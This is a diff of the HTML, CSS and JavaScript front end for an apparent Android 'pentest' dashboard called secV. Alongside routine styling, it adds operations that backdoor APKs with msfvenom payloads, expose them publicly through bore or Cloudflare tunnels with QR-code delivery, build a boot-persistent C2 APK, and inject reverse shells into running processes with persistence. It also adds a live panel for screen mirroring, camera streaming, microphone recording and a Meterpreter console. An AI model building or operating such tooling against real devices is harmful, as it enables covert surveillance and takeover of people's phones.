+  padding:2px 8px;color:var(--text);border-bottom:1px solid var(--border);
+  white-space:nowrap;cursor:pointer;
+}
+#proc-table tr:hover td{background:var(--bg2);color:var(--white);}
+#proc-table tr.selected td{background:var(--bg3);color:var(--green);}
+#proc-table td.ps-pid{color:var(--muted);}
+#proc-table td.ps-user{color:var(--blue-dim);}
+#proc-table td.ps-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;}
+#proc-table td.ps-state-R{color:var(--green);}
+#proc-table td.ps-state-S{color:var(--muted);}
+#proc-table td.ps-state-Z{color:var(--red);}
+
 /* TOP BAR */
 #topbar{
   display:flex;align-items:center;gap:14px;padding:0 18px;height:52px;
@@ -439,7 +1082,14 @@ a{color:var(--blue);text-decoration:none;}
 #topbar .devbadge{
   display:flex;align-items:center;gap:8px;
   border:1px solid var(--border2);padding:4px 12px;
+  transition:border-color var(--t);
 }
+#topbar .devbadge.connected{border-color:rgba(76,175,80,0.45);}
+#topbar .devbadge #dev-dot{
+  width:5px;height:5px;background:var(--muted);flex-shrink:0;
+  transition:background var(--t),box-shadow var(--t);
+}
+#topbar .devbadge.connected #dev-dot{background:var(--green);box-shadow:0 0 5px var(--green);}
 #topbar .devbadge #dev-name{color:var(--white);font-size:0.72rem;font-family:var(--mono);}
 #topbar .devbadge #dev-os{color:var(--muted);font-size:0.6rem;}
 #topbar .tb-btn{
@@ -545,11 +1195,36 @@ a{color:var(--blue);text-decoration:none;}
 
 /* TERMINAL */
 #terminal-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;}
+#term-toolbar{
+  display:flex;align-items:center;gap:6px;padding:4px 10px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;
+}
+#term-toolbar .tt-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
+  transition:color var(--t),border-color var(--t);white-space:nowrap;
+}
+#term-toolbar .tt-btn:hover{color:var(--white);border-color:var(--border3);}
+#term-toolbar .tt-btn.active{color:var(--green);border-color:var(--green);}
+#term-find-bar{display:none;align-items:center;gap:5px;flex:1;}
+#term-find-bar.open{display:flex;}
+#term-find-inp{
+  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
+  font-family:var(--mono);font-size:0.68rem;padding:2px 8px;outline:none;width:160px;
+}
+#term-find-inp:focus{border-color:var(--green);}
+#term-find-count{font-size:0.58rem;color:var(--muted);white-space:nowrap;}
+.tt-sep{width:1px;height:14px;background:var(--border2);flex-shrink:0;}
+#term-line-ct{font-size:0.58rem;color:var(--muted);margin-left:auto;white-space:nowrap;}
 #terminal{
   flex:1;overflow-y:auto;padding:14px 18px;background:var(--bg);
   font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;word-break:break-all;
 }
+#terminal.nowrap{white-space:nowrap;word-break:normal;overflow-x:auto;}
 #terminal .ln{display:block;}
+#terminal .ln.find-match{background:rgba(255,204,68,0.15);}
+#terminal .ln.find-current{background:rgba(255,204,68,0.35);}
+#terminal .find-hl{background:rgba(255,204,68,0.5);color:var(--bg);}
 #terminal .ts{color:var(--muted);margin-right:8px;user-select:none;font-size:0.62rem;}
 
 /* ADB CONSOLE */
@@ -569,21 +1244,111 @@ a{color:var(--blue);text-decoration:none;}
 }
 
 /* FINDINGS */
-#findings-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
-.finding-card{
-  background:var(--bg1);border:1px solid var(--border2);
-  margin-bottom:8px;padding:14px 16px;
+#findings-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
+#f-toolbar{
+  display:flex;align-items:center;gap:8px;padding:6px 14px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
 }
-.finding-card .fh{display:flex;gap:8px;align-items:center;margin-bottom:6px;}
+#f-toolbar .f-tab{
+  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.07em;color:var(--muted);
+  cursor:pointer;padding:2px 10px;border-bottom:2px solid transparent;
+  transition:color var(--t);white-space:nowrap;
+}
+#f-toolbar .f-tab:hover{color:var(--grey);}
+#f-toolbar .f-tab.active{color:var(--white);border-bottom-color:var(--white);}
+#f-toolbar .f-actions{margin-left:auto;display:flex;gap:6px;}
+#f-toolbar .f-action-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
+}
+#f-toolbar .f-action-btn:hover{color:var(--white);border-color:var(--border3);}
+#f-body{flex:1;overflow-y:auto;padding:14px 16px;}
+#f-empty{padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;}
+.f-section{margin-bottom:14px;border:1px solid var(--border2);}
+.f-section-hdr{
+  display:flex;align-items:center;gap:8px;
+  padding:6px 12px;background:var(--bg2);border-bottom:1px solid var(--border2);
+  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;
+  color:var(--muted);cursor:pointer;user-select:none;
+}
+.f-section-hdr:hover{color:var(--grey);}
+.f-section-hdr .f-toggle{margin-left:auto;font-size:0.65rem;}
+.f-section-body{padding:10px 14px;}
+.f-kv-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px 14px;}
+.f-kv{display:flex;flex-direction:column;padding:4px 0;border-bottom:1px solid var(--border);}
+.f-kv .fk{font-size:0.58rem;color:var(--muted);letter-spacing:0.08em;text-transform:uppercase;}
+.f-kv .fv{font-size:0.73rem;color:var(--white);font-family:var(--mono);margin-top:1px;}
+.f-kv .fv.ok{color:var(--green);}
+.f-kv .fv.warn{color:#e67828;}
+.f-kv .fv.crit{color:var(--red);}
+.f-summary-chips{display:flex;gap:6px;flex-wrap:wrap;padding:8px 14px;}
 .sev{font-size:0.52rem;letter-spacing:0.1em;text-transform:uppercase;padding:2px 8px;font-weight:600;}
 .sev.CRITICAL{background:var(--red-dim);color:var(--red);border:1px solid rgba(229,57,53,0.3);}
 .sev.HIGH{background:rgba(230,120,40,0.1);color:#e67828;border:1px solid rgba(230,120,40,0.3);}
 .sev.MEDIUM{background:rgba(200,170,50,0.1);color:#c8aa32;border:1px solid rgba(200,170,50,0.3);}
 .sev.LOW{background:var(--blue-dim);color:var(--blue);border:1px solid rgba(61,139,205,0.3);}
 .sev.INFO{background:var(--green-dim);color:var(--green);border:1px solid rgba(76,175,80,0.3);}
-.finding-card .fdesc{font-size:0.75rem;color:var(--text);line-height:1.7;}
+.f-vuln-row{
+  display:flex;align-items:flex-start;gap:10px;padding:7px 0;
+  border-bottom:1px solid var(--border);font-size:0.72rem;
+}
+.f-vuln-row:last-child{border-bottom:none;}
+.f-vuln-text{flex:1;color:var(--text);line-height:1.6;}
+.f-vuln-text b{color:var(--white);display:block;margin-bottom:2px;}
+.f-vuln-text .f-rec{color:var(--muted);font-size:0.66rem;margin-top:3px;}
+.f-vuln-row .f-cve{font-size:0.6rem;color:var(--blue);white-space:nowrap;}
+.f-filter-row{display:flex;gap:5px;padding:8px 14px;flex-wrap:wrap;}
+.f-filt{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 8px;cursor:pointer;
+}
+.f-filt:hover{border-color:var(--border3);color:var(--grey);}
+.f-filt.on{color:var(--white);border-color:var(--white);}
+.f-filt.on.CRITICAL{color:var(--red);border-color:var(--red);}
+.f-filt.on.HIGH{color:#e67828;border-color:#e67828;}
+.f-filt.on.MEDIUM{color:#c8aa32;border-color:#c8aa32;}
+.f-filt.on.LOW{color:var(--blue);border-color:var(--blue);}
+.f-app-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);}
+.f-app-row .f-app-pkg{font-family:var(--mono);font-size:0.7rem;color:var(--white);flex:1;}
+.f-app-row .f-score{font-size:0.62rem;padding:2px 8px;}
+.f-delivery{padding:10px 14px;}
+.f-del-url{
+  display:flex;align-items:center;gap:8px;background:var(--bg2);
+  border:1px solid var(--border2);padding:8px 12px;margin-bottom:8px;
+}
+.f-del-url .f-url-text{
+  flex:1;font-family:var(--mono);font-size:0.72rem;color:var(--blue);
+  word-break:break-all;line-height:1.5;
+}
+.f-del-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;
+  padding:3px 10px;cursor:pointer;white-space:nowrap;flex-shrink:0;
+}
+.f-del-btn:hover{color:var(--white);border-color:var(--white);}
+.f-del-btn.primary{border-color:var(--green);color:var(--green);}
+.f-del-qr{
+  background:var(--bg2);border:1px solid var(--border2);padding:10px;
+  font-family:var(--mono);font-size:0.62rem;line-height:1.0;color:var(--green);
+  overflow-x:auto;white-space:pre;margin-bottom:8px;
+}
+.f-del-cmd{
+  display:flex;align-items:center;gap:8px;background:var(--bg2);
+  border:1px solid var(--border2);padding:6px 12px;margin-bottom:6px;font-size:0.68rem;
+}
+.f-del-cmd code{flex:1;font-family:var(--mono);color:var(--text);}
+.f-del-cmd .f-del-btn{padding:2px 8px;}
+.f-errors{padding:10px 14px;}
+.f-err-item{
+  background:var(--red-dim);border:1px solid rgba(229,57,53,0.3);
+  padding:8px 12px;margin-bottom:6px;font-size:0.72rem;color:var(--red);font-family:var(--mono);
+}
+.f-raw pre{
+  padding:10px 14px;font-family:var(--mono);font-size:0.65rem;color:var(--muted);
+  overflow-x:auto;white-space:pre;line-height:1.6;
+}
 
-/* QR TAB */
+/* DELIVERY TAB */
 #qr-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
 .qr-card{
   background:var(--bg1);border:1px solid var(--border2);
@@ -669,13 +1434,189 @@ a{color:var(--blue);text-decoration:none;}
   display:flex;align-items:center;gap:10px;padding:6px 16px;
   background:var(--bg1);border-top:1px solid var(--border2);flex-shrink:0;
   font-size:0.6rem;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);
+  position:relative;overflow:hidden;
 }
-#status-dot{width:5px;height:5px;background:var(--muted);}
-#status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green);}
+#status-dot{width:5px;height:5px;background:var(--muted);transition:background var(--t),box-shadow var(--t);}
+#status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .9s infinite;}
 #status-text{flex:1;color:var(--grey);}
 #status-time{color:var(--muted);}
 #workdir-link{color:var(--muted);cursor:pointer;transition:color var(--t);}
 #workdir-link:hover{color:var(--white);}
+
+/* PROGRESS BAR */
+#progress-bar{
+  position:absolute;bottom:0;left:0;height:2px;width:0%;
+  background:var(--white);transition:width .4s ease,opacity .3s;opacity:0;
+}
+#progress-bar.active{opacity:1;animation:progress-indeterminate 1.6s linear infinite;}
+@keyframes progress-indeterminate{
+  0%  {left:-40%;width:40%;}
+  50% {left:30%;width:60%;}
+  100%{left:100%;width:40%;}
+}
+
+/* TERMINAL LINE ANIMATION */
+@keyframes fadeSlideIn{
+  from{opacity:0;transform:translateY(3px);}
+  to  {opacity:1;transform:translateY(0);}
+}
+#terminal .ln{animation:fadeSlideIn .1s ease both;}
+
+/* RUN BUTTON STATES */
+#run-btn.running{
+  background:var(--bg4);color:var(--muted);cursor:not-allowed;
+  animation:runPulse 1s infinite;
+}
+@keyframes runPulse{0%,100%{opacity:1}50%{opacity:.5}}
+
+/* TOAST NOTIFICATIONS */
+#toast-container{
+  position:fixed;bottom:48px;right:16px;z-index:9999;
+  display:flex;flex-direction:column-reverse;gap:6px;pointer-events:none;
+}
+.toast{
+  background:var(--bg3);border:1px solid var(--border2);
+  padding:8px 14px;font-family:var(--mono);font-size:0.65rem;
+  letter-spacing:0.04em;color:var(--white);max-width:320px;
+  animation:toastIn .2s ease both;
+}
+.toast.connect{border-left:2px solid var(--green);}
+.toast.disconnect{border-left:2px solid var(--red);}
+.toast.info{border-left:2px solid var(--blue);}
+@keyframes toastIn{from{opacity:0;transform:translateX(12px);}to{opacity:1;transform:translateX(0);}}
+@keyframes toastOut{from{opacity:1;}to{opacity:0;transform:translateX(12px);}}
+
+/* TOPBAR ACCENT */
+#topbar::after{
+  content:'';position:absolute;left:0;bottom:0;height:1px;width:100%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);
+  pointer-events:none;
+}
+#topbar{position:relative;}
+
+/* PARAMS PANEL TRANSITION */
+#params-panel{transition:opacity .12s ease;}
+#params-panel.switching{opacity:0;}
+
+/* SIDEBAR HOVER ACCENT */
+.op-item::before{
+  content:'';position:absolute;left:0;top:0;height:100%;width:2px;
+  background:var(--white);transform:scaleY(0);transition:transform .14s ease;
+}
+.op-item{position:relative;}
+.op-item:hover::before{transform:scaleY(0.6);}
+.op-item.active::before{transform:scaleY(1);}
+
+/* DEVBADGE CONNECTED PULSE */
+#topbar .devbadge.connected #dev-dot{
+  animation:devPulse 2.4s ease-in-out infinite;
+}
+@keyframes devPulse{
+  0%,100%{box-shadow:0 0 4px var(--green);}
+  50%    {box-shadow:0 0 10px var(--green),0 0 20px rgba(76,175,80,0.3);}
+}
+
+/* ── LIVE MEDIA PANEL ─────────────────────────────────────────────────────── */
+#live-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;gap:14px;}
+
+/* Screen mirror */
+.live-section{background:var(--bg1);border:1px solid var(--border2);}
+.live-section-hdr{
+  display:flex;align-items:center;gap:10px;padding:8px 14px;
+  border-bottom:1px solid var(--border2);
+}
+.live-section-hdr .live-label{
+  font-family:var(--disp);font-size:0.7rem;font-weight:700;
+  color:var(--white);letter-spacing:0.06em;text-transform:uppercase;flex:1;
+}
+.live-section-hdr .live-dot{
+  width:6px;height:6px;background:var(--muted);
+  transition:background var(--t),box-shadow var(--t);
+}
+.live-section-hdr .live-dot.on{background:var(--red);box-shadow:0 0 6px var(--red);
+  animation:recPulse 1s infinite;}
+@keyframes recPulse{0%,100%{opacity:1}50%{opacity:.3}}
+.live-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  padding:4px 12px;font-family:var(--mono);font-size:0.6rem;
+  letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
+  transition:all var(--t);
+}
+.live-btn:hover{color:var(--white);border-color:var(--border3);}
+.live-btn.active{background:var(--red-dim);color:var(--red);border-color:rgba(229,57,53,0.5);}
+.live-btn.go{background:var(--white);color:var(--bg);border-color:var(--white);}
+.live-btn.go:hover{background:var(--off);}
+.live-select{
+  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
+  font-family:var(--mono);font-size:0.65rem;padding:4px 6px;
+}
+.live-input{
+  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
+  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;width:70px;
+}
+#screen-wrap{
+  position:relative;background:#000;display:flex;
+  align-items:center;justify-content:center;min-height:200px;
+}
+#screen-img{
+  max-width:100%;max-height:480px;object-fit:contain;display:none;
+}
+#screen-placeholder{
+  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
+  text-transform:uppercase;padding:40px;
+}
+#screen-overlay{
+  position:absolute;top:6px;right:6px;
+  background:rgba(0,0,0,0.7);padding:3px 8px;
+  font-size:0.55rem;color:var(--green);letter-spacing:0.1em;display:none;
+}
+
+/* Camera + Audio grid */
+.live-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+@media(max-width:800px){.live-grid{grid-template-columns:1fr;}}
+#camera-img{max-width:100%;max-height:260px;object-fit:contain;display:none;}
+#camera-placeholder{
+  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
+  text-transform:uppercase;padding:30px;text-align:center;
+}
+.camera-wrap{background:#000;display:flex;align-items:center;justify-content:center;min-height:140px;}
+
+/* Audio */
+.audio-row{
+  display:flex;align-items:center;gap:10px;padding:10px 14px;
+  border-bottom:1px solid var(--border);
+}
+.audio-row:last-child{border-bottom:none;}
+.audio-label{color:var(--grey);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;flex:0 0 80px;}
+#mic-visualizer{
+  flex:1;height:28px;background:var(--bg2);border:1px solid var(--border);
+  overflow:hidden;display:flex;align-items:center;gap:1px;padding:0 4px;
+}
+.mic-bar{width:3px;background:var(--green);transition:height .08s;}
+#mic-audio{width:100%;margin-top:4px;display:none;}
+.speaker-file{
+  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
+  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;flex:1;cursor:pointer;
+}
+
+/* MSF Console */
+#msf-terminal{
+  flex:1;min-height:200px;max-height:320px;overflow-y:auto;
+  padding:10px 14px;background:var(--bg);
+  font-family:var(--mono);font-size:0.72rem;line-height:1.75;
+  white-space:pre-wrap;word-break:break-all;
+}
+#msf-input-row{
+  display:flex;gap:8px;padding:8px 14px;background:var(--bg1);
+  border-top:1px solid var(--border2);align-items:center;
+}
+#msf-input-row span{color:var(--red);font-size:0.72rem;}
+#msf-input{
+  flex:1;background:transparent;border:none;color:var(--white);
+  font-family:var(--mono);font-size:0.72rem;outline:none;
+}
+#msf-status{font-size:0.58rem;letter-spacing:0.1em;color:var(--muted);}
+#msf-status.on{color:var(--green);}
 </style>
 </head>
 <body>
@@ -683,15 +1624,24 @@ a{color:var(--blue);text-decoration:none;}
 <!-- TOP BAR -->
 <div id="topbar">
   <div class="logo">secV<span class="logo-sep">/</span><span class="logo-sub">android pentest</span></div>
-  <div class="devbadge">
+  <div class="devbadge" id="devbadge">
+    <div id="dev-dot"></div>
     <div id="dev-name">no device</div>
     <div id="dev-os"></div>
   </div>
   <span id="lhost-display"></span>
-  <button class="tb-btn" onclick="refreshDevices()">⟳</button>
+  <span id="dev-count" style="font-size:0.58rem;color:var(--muted);letter-spacing:0.1em;"></span>
+  <button class="tb-btn" onclick="refreshDevices()" title="Poll for devices">⟳ refresh</button>
+  <button class="tb-btn" id="reload-btn" onclick="forceReloadADB()" title="Kill + restart ADB server">⚡ reload adb</button>
   <button class="tb-btn" onclick="clearTerminal()">⌧ clear</button>
   <button class="tb-btn" onclick="switchTab('setup')">⚙ setup</button>
   <button class="tb-btn" id="kill-btn" onclick="killOp()">✕ kill</button>
+</div>
+
+<!-- SESSIONS BAR -->
+<div id="sessions-bar">
+  <span id="sess-label">Sessions</span>
+  <span id="sess-count"></span>
 </div>
 
 <!-- MAIN -->
@@ -714,6 +1664,22 @@ a{color:var(--blue);text-decoration:none;}
       <div class="op-title" id="op-title">Select an operation</div>
       <div class="op-desc" id="op-desc">Click any operation in the sidebar to configure and run it.</div>
       <div id="params-form"></div>
+      <!-- PROCESS SNIFFER PANEL (shown only for process_inject) -->
+      <div id="proc-sniff-panel">
+        <div class="ps-toolbar">
+          <span style="font-family:var(--mono);font-size:0.64rem;color:var(--muted);letter-spacing:0.06em;white-space:nowrap;">LIVE PROCESSES</span>
+          <input id="ps-filter" class="ps-filter" type="text" placeholder="filter by name or PID…" oninput="onPsFilter()">
+          <button class="ps-btn" id="ps-toggle-btn" onclick="toggleProcStream()">▶ stream</button>
+          <button class="ps-btn" onclick="refreshProcs()">↺ refresh</button>
+          <span class="ps-count" id="ps-count">0 procs</span>
+        </div>
+        <table id="proc-table">
+          <thead><tr>
+            <th>PID</th><th>PPID</th><th>USER</th><th>S</th><th>PROCESS NAME</th>
+          </tr></thead>
+          <tbody id="proc-tbody"></tbody>
+        </table>
+      </div>
     </div>
 
     <!-- TABS -->
@@ -725,6 +1691,7 @@ a{color:var(--blue);text-decoration:none;}
       <div class="tab" onclick="switchTab('files')">Files</div>
       <div class="tab" onclick="switchTab('setup')">Setup/Deps</div>
       <div class="tab" id="c2-tab" onclick="switchTab('c2')">C2 Dashboard</div>
+      <div class="tab" id="live-tab" onclick="switchTab('live')">Live Media <span id="live-badge" class="badge" style="display:none">●</span></div>
     </div>
 
     <!-- TERMINAL TAB -->
@@ -762,6 +1729,99 @@ a{color:var(--blue);text-decoration:none;}
         <div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Loading...</div>
       </div>
     </div>
+    <!-- LIVE MEDIA PANEL -->
+    <div id="live-panel">
+      <!-- Screen Mirror -->
+      <div class="live-section">
+        <div class="live-section-hdr">
+          <div class="live-dot" id="screen-dot"></div>
+          <div class="live-label">Screen Mirror</div>
+          <button class="live-btn go" onclick="startScreen()">▶ Start</button>
+          <button class="live-btn active" onclick="stopScreen()" style="display:none" id="screen-stop-btn">■ Stop</button>
+          <button class="live-btn" onclick="snapScreen()">⬡ Snap</button>
+          <span id="screen-fps" style="font-size:0.58rem;color:var(--muted);margin-left:4px;letter-spacing:0.06em;"></span>
+        </div>
+        <div id="screen-wrap">
+          <div id="screen-placeholder">Screen mirror off — click Start to begin streaming</div>
+          <img id="screen-img" alt="screen" />
+          <div id="screen-overlay">● LIVE</div>
+        </div>
+      </div>
+
+      <!-- Camera + Audio -->
+      <div class="live-grid">
+        <!-- Camera -->
+        <div class="live-section">
+          <div class="live-section-hdr">
+            <div class="live-dot" id="cam-dot"></div>
+            <div class="live-label">Camera</div>
+            <select class="live-select" id="cam-id">
+              <option value="0">Camera 0 (back)</option>
+              <option value="1">Camera 1 (front)</option>
+            </select>
+            <button class="live-btn" onclick="camSnap()">⬡ Snap</button>
+            <button class="live-btn go" onclick="startCamStream()">▶ Stream</button>
+            <input class="live-input" id="cam-port" type="text" value="8880" placeholder="MSF port" style="width:56px;">
+          </div>
+          <div class="camera-wrap">
+            <div id="camera-placeholder">Camera off — use Meterpreter webcam_stream or Snap</div>
+            <img id="camera-img" alt="camera" />
+          </div>
+        </div>
+
+        <!-- Audio -->
+        <div class="live-section">
+          <div class="live-section-hdr">
+            <div class="live-dot" id="audio-dot"></div>
+            <div class="live-label">Audio</div>
+          </div>
+          <!-- Microphone -->
+          <div class="audio-row">
+            <span class="audio-label">Mic</span>
+            <div id="mic-visualizer"></div>
+            <button class="live-btn" id="mic-btn" onclick="toggleMic()">▶ Record</button>
+            <select class="live-select" id="mic-dur">
+              <option value="3">3s</option>
+              <option value="5" selected>5s</option>
+              <option value="10">10s</option>
+            </select>
+          </div>
+          <div style="padding:4px 14px 8px;">
+            <audio id="mic-audio" controls style="width:100%;height:28px;display:none;"></audio>
+            <div id="mic-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;margin-top:4px;">Idle</div>
+          </div>
+          <!-- Speaker -->
+          <div class="audio-row">
+            <span class="audio-label">Speaker</span>
+            <label class="speaker-file" id="spk-label" for="spk-file">Choose audio file…</label>
+            <input type="file" id="spk-file" accept="audio/*" style="display:none" onchange="speakerFileChosen(this)">
+            <button class="live-btn go" onclick="pushSpeaker()">▶ Push</button>
+          </div>
+          <div style="padding:4px 14px 8px;">
+            <div id="spk-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;">No file selected</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- MSF Meterpreter Console -->
+      <div class="live-section">
+        <div class="live-section-hdr">
+          <div class="live-dot" id="msf-dot"></div>
+          <div class="live-label">Meterpreter Console</div>
+          <span id="msf-status">offline</span>
+          <button class="live-btn go" onclick="startMsf()">▶ Start MSF</button>
+          <button class="live-btn active" onclick="stopMsf()">■ Stop</button>
+          <button class="live-btn" onclick="msfSend('sessions -l')">sessions</button>
+          <button class="live-btn" onclick="msfSend('help')">help</button>
+        </div>
+        <div id="msf-terminal"></div>
+        <div id="msf-input-row">
+          <span>msf&gt;&nbsp;</span>
+          <input id="msf-input" type="text" placeholder="sessions -i 1; screenshot; webcam_stream -l 0.0.0.0 -p 8880"
+                 onkeydown="msfEnter(event)">
+        </div>
+      </div>
+    </div>
     <!-- C2 PANEL -->
     <div id="c2-panel">
       <div id="c2-toolbar">
@@ -791,7 +1851,11 @@ a{color:var(--blue);text-decoration:none;}
   <div id="status-text">idle</div>
   <div id="status-time"></div>
   <div id="workdir-link" onclick="switchTab('files');loadFiles()">~/.secv/android/</div>
+  <div id="progress-bar"></div>
 </div>
+
+<!-- TOAST CONTAINER -->
+<div id="toast-container"></div>
 
 <script>
 // ── Operation definitions ─────────────────────────────────────────────────────
@@ -852,21 +1916,33 @@ const OPS = {
      ]},
   ],
   "Payload & Delivery": [
-    {id:"backdoor_apk", label:"backdoor APK", desc:"Pull APK, inject msfvenom payload (-x template), sign, optionally install",
+    {id:"backdoor_apk", label:"backdoor APK",
+     desc:"Pull APK → inject msfvenom payload (-x template) → sign → WAN expose (bore/cloudflare) → delivery QR. WAN expose runs automatically unless disabled.",
+     runLabel:"INJECT",
      fields:[
-       {n:"package",p:"",t:"text",label:"Package (or leave blank for local APK)"},
-       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
+       {n:"package",p:"",t:"text",label:"Package (blank = local APK)"},
+       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
        {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
        {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install on device"},
+       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose (bore/cloudflare)"},
+       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
+       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
      ]},
-    {id:"deploy_shell", label:"deploy shell", desc:"Generate fresh msfvenom APK + install via adb (no root required)",
+    {id:"deploy_shell", label:"deploy shell",
+     desc:"Generate fresh msfvenom APK → adb install (no root) → WAN expose + delivery QR. Installs directly onto device; WAN expose runs automatically unless disabled.",
+     runLabel:"INJECT",
      fields:[
-       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
+       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
        {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
+       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after deploy"},
+       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
+       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
      ]},
-    {id:"rebuild", label:"rebuild APK", desc:"Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore + QR delivery",
+    {id:"rebuild", label:"rebuild APK",
+     desc:"Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore tunnel + QR delivery",
+     runLabel:"BUILD",
      fields:[
        {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
        {n:"msf",p:"false",t:"select",opts:["false","true"],label:"Merge MSF payload"},
@@ -875,27 +1951,15 @@ const OPS = {
        {n:"bore_msf_port",p:"37993",t:"text",label:"bore MSF port"},
        {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
      ]},
-    {id:"objection_patch", label:"objection patch", desc:"Embed Frida gadget into APK via objection — no root needed at runtime",
+    {id:"objection_patch", label:"objection patch",
+     desc:"Embed Frida gadget into APK via objection (no root needed at runtime) → sign → WAN expose + delivery QR",
+     runLabel:"PATCH",
      fields:[
        {n:"package",p:"com.target.app",t:"text",label:"Package"},
        {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install patched APK"},
-     ]},
-    {id:"wan_expose", label:"WAN expose", desc:"Expose MSF listener + APK over Cloudflare Tunnel; auto-falls back to bore",
-     fields:[
-       {n:"lport",p:"4444",t:"text",label:"LPORT"},
+       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after patch"},
        {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
-       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
        {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
-     ]},
-    {id:"qr_exploit", label:"QR exploit", desc:"Generate QR for APK URL, Intent URI, ADB wireless pairing, deeplink, or WAN bore tunnel",
-     fields:[
-       {n:"qr_mode",p:"apk",t:"select",opts:["apk","intent","adb_pair","deeplink","wan","custom"],label:"QR mode"},
-       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
-       {n:"lport",p:"8888",t:"text",label:"LPORT / serve port"},
-       {n:"apk_path",p:"",t:"text",label:"APK path (wan mode)"},
-       {n:"pair_port",p:"37001",t:"text",label:"Pairing port (adb_pair)"},
-       {n:"pair_code",p:"123456",t:"text",label:"Pairing code (adb_pair)"},
-       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server (wan)"},
      ]},
   ],
   "Instrumentation": [
@@ -910,6 +1974,17 @@ const OPS = {
      fields:[{n:"package",p:"com.target.app",t:"text",label:"Package"}]},
     {id:"unhook", label:"unhook", desc:"Remove all injected hooks planted by the hook operation",
      fields:[]},
+    {id:"process_inject", label:"process inject", desc:"Live process sniffer — attach to running APK process and inject reverse shell; optional persistence",
+     runLabel:"INJECT",
+     fields:[
+       {n:"action",p:"inject",t:"select",opts:["sniff","inject","persist_only"],label:"Action"},
+       {n:"target_process",p:"",t:"text",label:"PID or package (click row below)"},
+       {n:"inject_mode",p:"frida",t:"select",opts:["frida","ptrace"],label:"Inject mode"},
+       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
+       {n:"lport",p:"4444",t:"text",label:"LPORT"},
+       {n:"persist",p:"true",t:"select",opts:["true","false"],label:"Install persistence"},
+     ],
+     hasProcSniff: true},
   ],
   "Persistence": [
     {id:"persist", label:"persist", desc:"Boot Receiver (no root) + Magisk post-fs-data.d script + Magisk module service.sh",
@@ -963,14 +2038,17 @@ let findings   = [];
 let qrList     = [];
 let findingsCount = 0;
 let qrCount    = 0;
-let es         = null;
-let opStartTs  = null;
+let es             = null;
+let opStartTs      = null;
+let _activeSessions = {};   // sid → {id,op,device,status,startTs,color}
+let _sessionColors = ['#4caf50','#44ddff','#ffcc44','#aa66ff','#4488ff',
